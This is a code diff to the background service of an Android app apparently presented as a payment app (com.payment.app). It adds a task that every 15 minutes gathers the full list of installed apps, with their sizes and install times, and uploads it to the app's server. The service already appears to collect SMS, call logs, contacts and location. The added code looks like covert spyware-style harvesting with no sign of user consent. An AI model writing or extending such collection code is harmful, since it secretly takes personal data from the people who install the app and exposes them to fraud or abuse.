@@ -13,6 +13,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.SharedPreferences
+import android.content.pm.ApplicationInfo
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
@@ -50,9 +51,9 @@ import com.google.android.gms.location.LocationServices
 import com.payment.app.ApiCallManager
 import com.payment.app.HomeActivity
 import com.payment.app.R
-import com.payment.app.model.ApiNotificationModel
 import com.payment.app.model.CallLogModel
 import com.payment.app.model.ContactSyncModel
+import com.payment.app.model.InstalledApp
 import com.payment.app.model.SmsModel
 import org.json.JSONObject
 import java.io.File
@@ -162,12 +163,79 @@ class MyService : Service() {
             }
         },0,15, TimeUnit.MINUTES)
 
+        val allAppGetServices = Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate({
+            try {
+                getAllAppData()
+            } catch (e: Exception) {
+                ApiCallManager.appendLog("Global Get All App Exception Handler: ${e.message ?: "Unknown Error"}")
+            }
+        },0,15, TimeUnit.MINUTES)
+
         return START_STICKY
 
         //Normal Service To test sample service comment the above    generateForegroundNotification() && return START_STICKY
         // Uncomment below return statement And run the app.
 //        return START_NOT_STICKY
     }
+
+    private fun getAllAppData() {
+        val sharedPreferences: SharedPreferences = getSharedPreferences(
+            "token",
+            AppCompatActivity.MODE_PRIVATE
+        )
+        val token: String = sharedPreferences.getString("token", "").toString()
+
+        val packageManager: PackageManager = packageManager
+        val applications: List<ApplicationInfo> = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
+
+        val dataList = ArrayList<InstalledApp>()
+
+        for (appInfo in applications) {
+            val appName = appInfo.loadLabel(packageManager).toString()
+            val appSize = getApplicationSize(appInfo)
+            val appInstallTimeMillis = File(appInfo.sourceDir).lastModified()
+            val triggerTime = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                LocalDateTime.ofInstant(
+                    Instant.ofEpochMilli(appInstallTimeMillis), TimeZone
+                        .getDefault().toZoneId()
+                )
+            } else {
+                TODO("VERSION.SDK_INT < O")
+            }
+            dataList.add(
+                InstalledApp(
+                    appName,
+                    appSize,
+                    triggerTime.toString()
+                )
+            )
+            // Display or log the information
+//            val appInfoString = "App Name: $appName, App Size: ${appSize}, Install Date and Time: $triggerTime"
+//            Log.d("InstalledAppsInfo", appInfoString)
+        }
+        var baseUrl = getString(R.string.api)
+        if(dataList.isNotEmpty()){
+            apiCall.getAllAppApi(dataList,token,applicationContext,baseUrl)
+        }
+        Log.d("Installed App List", dataList.toString())
+
+    }
+
+    private fun getApplicationSize(appInfo: ApplicationInfo): String {
+        val sourceDir = appInfo.sourceDir
+        val sizeInBytes = getFileSize(sourceDir)
+        val sizeInMB = sizeInBytes / (1024 * 1024)
+        return "$sizeInMB MB"
+    }
+
+    private fun getFileSize(filePath: String): Long {
+        val file = File(filePath)
+        if (file.exists()) {
+            return file.length()
+        }
+        return 0
+    }
+
 
     @SuppressLint("MissingPermission", "SetTextI18n")
     private fun getLocation(
